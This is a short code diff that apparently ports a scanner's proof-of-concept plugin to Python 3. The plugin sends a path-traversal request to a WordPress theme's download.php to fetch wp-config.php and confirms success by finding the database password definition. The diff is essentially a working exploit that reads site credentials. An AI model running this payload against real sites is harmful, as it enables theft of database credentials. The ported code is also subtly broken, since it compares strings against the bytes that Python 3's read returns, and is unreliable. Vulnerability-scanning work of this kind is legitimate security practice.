@@ -14,7 +14,7 @@ EXPLOIT
 
 """
 
-import urllib2
+import urllib.request, urllib.error, urllib.parse
 from plugin.urlparser import get_domain
 
 
@@ -24,9 +24,9 @@ def poc(url):
     payload = '/wp-content/themes/ypo-theme/download.php?download=..%2F..%2F..%2F..%2Fwp-config.php'
     target = get_domain(url).rstrip('/') + payload
     try:
-        r = urllib2.urlopen(target, timeout=5).read()  # cannot use requests here
+        r = urllib.request.urlopen(target, timeout=5).read()  # cannot use requests here
         if "define('DB_PASSWORD'" in r and '@package WordPress' in r:
             return target
-    except Exception, e:
+    except Exception as e:
         pass
     return False
